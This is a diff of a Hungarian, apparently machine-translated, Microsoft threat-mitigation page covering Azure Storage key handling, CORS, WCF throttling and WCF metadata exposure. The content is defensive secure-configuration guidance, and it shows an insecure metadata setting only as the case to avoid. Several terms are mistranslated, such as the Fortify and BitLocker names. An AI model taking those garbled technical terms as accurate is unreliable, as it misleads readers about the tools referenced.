+| **Hivatkozások**              | [Az IoT Hub Device Management áttekintése](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [eszköz belső vezérlőprogramjának frissítése](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
+| **Lépések** | LWM2M egy olyan protokoll, az Open Mobile Alliance IoT eszközfelügyeleti. Az Azure IoT-Eszközfelügyelet lehetővé teszi, hogy a fizikai eszközöket eszközfeladatok használata kezelheti. Győződjön meg arról, hogy a Felhőátjáró valósít meg egy folyamatot, hogy rendszeresen tartsa meg az eszköz és más konfigurációs adatokat az Azure IoT Hub-Eszközfelügyelet segítségével naprakész. |
 
-## <a id="controls-policies"></a>Győződjön meg arról, hogy eszközök szervezeti házirendek szerint beállított végpont biztonsági vezérlő
+## <a id="controls-policies"></a>Győződjön meg arról, hogy eszközök rendelkeznek-e a szervezeti szabályzatok szerint konfigurált végponti biztonsági vezérlőket
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Gép megbízhatósági kapcsolat határán | 
 | **SDL fázis**               | Környezet |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
-| **Lépések** | Győződjön meg arról, hogy eszközök végponti biztonsági vezérlők, például a lemez szintű titkosítást, a víruskereső frissített aláírásokkal bit-tárolót, gazdagép alapú tűzfal, az operációs rendszer frissítései, a csoport házirendek stb szervezeti biztonsági házirendek megfelelően vannak konfigurálva. |
+| **Lépések** | Győződjön meg arról, hogy eszközök rendelkeznek végponti biztonsági vezérlők, például lemezszintű titkosítás, a víruskereső frissített jogosultságkódokkal bit-tárolót, gazdagép alapú tűzfal, operációs rendszer verziófrissítései, stb. a szervezeti biztonsági házirendek alapján vannak konfigurált szabályzatok csoportban. |
 
-## <a id="secure-keys"></a>Az Azure storage elérési kulcsok biztonságos kezelése
+## <a id="secure-keys"></a>Győződjön meg, hogy az Azure storage hozzáférési kulcsok biztonságos felügyeletéhez
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Azure Storage | 
 | **SDL fázis**               | Környezet |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [Az Azure Storage biztonsági útmutató - a Tárfiók kulcsait kezelése](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
-| **Lépések** | <p>Kulcstároló: Javasoljuk, hogy az Azure Storage elérési kulcsok tárolása az Azure Key Vault valamilyen titkos adatot, és az alkalmazásokat, a kulcs lekérése kulcstároló. Ez az alábbi okokból ajánlott:</p><ul><li>Az alkalmazás soha nem lesz a tárolási kulcs szoftveresen kötött a konfigurációs fájlban, amely egy, a kulcsok külön engedélye nélkül hozzáférést az adott erőfeszítések eltávolítja</li><li>A kulcsoknak Access Azure Active Directory használatával lehet irányítani. Ez azt jelenti, hogy a fiók tulajdonosának hozzáférést biztosíthat a néhány olyan alkalmazásokat, amelyek a kulcsok lekérése az Azure Key Vault kell. Más alkalmazások nem tudják a hívóbetűk őket engedély megadása kifejezetten nélkül</li><li>Kulcs újragenerálása: Javasoljuk, hogy rendelkezik egy folyamatot, hogy biztonsági okokból Azure tárelérési kulcsok újragenerálása. Arról, hogy miért részleteit és a kulcs újragenerálása tervezéséről az Azure Storage biztonsági útmutató áttekintésével foglalkozó cikkben ismertetett</li></ul>|
+| **Hivatkozások**              | [Az Azure Storage biztonsági útmutatóját - kezelése a Storage Account Keys](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
+| **Lépések** | <p>Kulcstároló: Javasoljuk az Azure tárelérési kulcsok tárolására az Azure Key Vaultban titkos kulcs, és az alkalmazások a kulcs lekérése a kulcstartóból. Ez a következő okok miatt ajánlott:</p><ul><li>Az alkalmazás soha nem lesznek a storage-kulcs szoftveresen kötött a konfigurációs fájlban, amely eltávolítja a sérülésre valaki hozzáférni az adott engedély nélkül a kulcsokat</li><li>A kulcsok a hozzáférést az Azure Active Directory használatával lehet irányítani. Ez azt jelenti, hogy fiók tulajdonosa adhat hozzáférést a kulcsok lekéréséhez az Azure Key vault igénylő alkalmazások néhány. Más alkalmazások nem tudják a hívóbetűk adva nekik kifejezetten engedély nélkül</li><li>Kulcs újragenerálása: Azt javasoljuk, hogy egy folyamatot, hogy biztonsági okokból az Azure tárelérési kulcsok újragenerálása. Arról, hogy miért részleteit és a kulcs újragenerálása megtervezése az Azure Storage biztonsági útmutatóját áttekintésével foglalkozó cikkben vannak dokumentálva</li></ul>|
 
-## <a id="cors-storage"></a>Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha a CORS engedélyezve van az Azure storage
+## <a id="cors-storage"></a>Győződjön meg arról, hogy csak megbízható források engedélyezettek, ha a CORS engedélyezve van az Azure storage
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Azure Storage | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [Az Azure Storage szolgáltatásainak CORS-támogatás](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
-| **Lépések** | Az Azure Storage lehetővé teszi a kereszt-eredetű erőforrások megosztása – a CORS engedélyezése. Minden tárfiók férhetnek hozzá a fiókhoz tartozó tárolási erőforrások tartományokat is megadhat. A CORS alapértelmezés szerint le van tiltva az összes szolgáltatás. Engedélyezheti a CORS hívja service házirendek beállítása a módszerek egyikét a REST API-t vagy a storage ügyféloldali kódtár segítségével. |
+| **Hivatkozások**              | [CORS-támogatás az Azure Storage-szolgáltatásokban](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
+| **Lépések** | Az Azure Storage lehetővé teszi, hogy engedélyezze a CORS-idegen eredetű erőforrások megosztása. Minden olyan tárfiókhoz a tárfiók az erőforrások eléréséhez tartományok is megadhat. A CORS az összes szolgáltatás alapértelmezés szerint le van tiltva. A CORS szolgáltatás házirendek beállítása a módszerek meghívására a REST API vagy a storage ügyféloldali kódtár használatával engedélyezheti. |
 
-## <a id="throttling"></a>A WCF szolgáltatás szabályozásával engedélyezése
+## <a id="throttling"></a>A szolgáltatás szabályozása a WCF szolgáltatás engedélyezése
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | WCF | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | .NET-keretrendszer 3 |
+| **Megfelelő technológiák** | .NET-keretrendszer 3 |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [erősítse meg Királyság](https://vulncat.fortify.com/en/vulncat/index.html) |
-| **Lépések** | <p>A rendszer-erőforrások nem helyezi maximális Erőforrásfogyás, és végső soron egy szolgáltatásmegtagadási eredményezheti.</p><ul><li>**Magyarázat:** Windows Communication Foundation (WCF) lehetővé teszi a szolgáltatáskérések szabályozás. Túl sok ügyfél kérésének engedélyezése a rendszer kéréssekkel, és az erőforrások lefoglalhat. Másrészről így csak kevés egy szolgáltatási kérelmet megakadályozhatják legitim felhasználók a szolgáltatás használatával. Minden szolgáltatás külön-külön legyen beállítva, hogy és konfigurálva ahhoz, hogy a megfelelő mennyiségű erőforrást.</li><li>**JAVASLATOK** engedélyezése WCF szabályozási szolgáltatás és a megadott korlát a megfelelő alkalmazás.</li></ul>|
+| **Lépések** | <p>Korlát nem helyezi a felhasznált rendszererőforrás erőforrás-fogyási típus és végső soron szolgáltatásmegtagadást eredményezheti.</p><ul><li>**Magyarázat:** Windows Communication Foundation (WCF) lehetőséget biztosít a szolgáltatáskérések szabályozását. Túl sok ügyfél kérésének engedélyezése kéréssekkel túlterhelheti a rendszer, és felhasználta a rendelkezésére az erőforrások. Másrészről így csak kevés egy szolgáltatáshoz érkező kérések megakadályozhatja legitim felhasználók a szolgáltatás használatával. Egyes szolgáltatások külön-külön használatára vannak konfigurálva és konfigurálni kell az erőforrások a megfelelő mennyiségét engedélyezi.</li><li>**JAVASLATOK** az alkalmazás megfelelő engedélyezése WCF szolgáltatás sávszélesség-szabályozási funkciót, és a beállított korlátokat.</li></ul>|
 
 ### <a name="example"></a>Példa
-A következő egy példa konfiguráció sávszélesség-szabályozás engedélyezve:
+Az alábbiakban látható egy példa konfiguráció látható sávszélesség-szabályozás engedélyezve:
 ```
 <system.serviceModel> 
   <behaviors>
@@ -621,29 +621,29 @@ A következő egy példa konfiguráció sávszélesség-szabályozás engedélye
 </system.serviceModel> 
 ```
 
-## <a id="info-metadata"></a>WCF-adatokhoz való illetéktelen hozzáférés metaadatok keresztül
+## <a id="info-metadata"></a>WCF-adatokhoz való illetéktelen hozzáférés, metaadatok keresztül
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | WCF | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | .NET-keretrendszer 3 |
+| **Megfelelő technológiák** | .NET-keretrendszer 3 |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [erősítse meg Királyság](https://vulncat.fortify.com/en/vulncat/index.html) |
-| **Lépések** | Metaadatok segítségével a támadók további tudnivalók a rendszer, és tervezze meg a támadást egy formája. WCF szolgáltatások úgy konfigurálhatók teszi közzé a metaadatok. Metaadatok szolgáltatás részletes leírását tartalmazza, és nem kell éles környezetben szórási. A `HttpGetEnabled`  /  `HttpsGetEnabled` a konfigurációs ServiceMetaData osztály tulajdonságait határozza meg, hogy a szolgáltatás a metaadatok teszi közzé. | 
+| **Lépések** | Metaadatok segítségével a támadók ismerje meg a rendszer, és a támadás űrlap tervezi. WCF-szolgáltatások elérhetővé metaadatok konfigurálható. Metaadatok szolgáltatás részletes ismertetése információkat nyújt, és nem kell az éles környezetben szórási. A `HttpGetEnabled`  /  `HttpsGetEnabled` ServiceMetaData osztály tulajdonságait határozza meg, hogy egy szolgáltatás a metaadatok teszi közzé. | 
 
 ### <a name="example"></a>Példa
-Az alábbi kódot arra utasítja a szolgáltatás metaadatai közvetíti WCF
+Az alábbi kód arra utasítja a WCF-szolgáltatás metaadatai adás
 ```
 ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
 smb.HttpGetEnabled = true; 
 smb.HttpGetUrl = new Uri(EndPointAddress); 
 Host.Description.Behaviors.Add(smb); 
 ```
-Éles környezetben a szolgáltatás metaadatai nem szórási. Állítsa be a HttpGetEnabled / FALSE osztály a konfigurációs ServiceMetaData HttpsGetEnabled tulajdonságait. 
+Éles környezetben a szolgáltatás metaadatai nem küldhet. Állítsa be a HttpGetEnabled / hamis osztály a ServiceMetaData HttpsGetEnabled tulajdonságait. 
 
 ### <a name="example"></a>Példa
-Az alábbi kódot a szolgáltatás metaadatai nem közvetíti WCF utasítja. 
+Az alábbi kódot a WCF-szolgáltatás metaadatai nem adás utasítja. 
 ```
 ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
 smb.HttpGetEnabled = false; 
